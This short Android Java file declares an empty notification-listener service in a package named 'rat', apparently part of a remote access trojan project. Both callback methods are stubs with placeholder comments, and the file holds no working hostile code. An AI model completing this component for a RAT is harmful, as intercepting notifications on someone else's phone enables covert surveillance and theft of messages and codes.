package com.fly0rakoon.rat.services;


import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class NotificationService extends NotificationListenerService {
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        // Handle posted notification
    }
    
    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Handle removed notification
    }
}

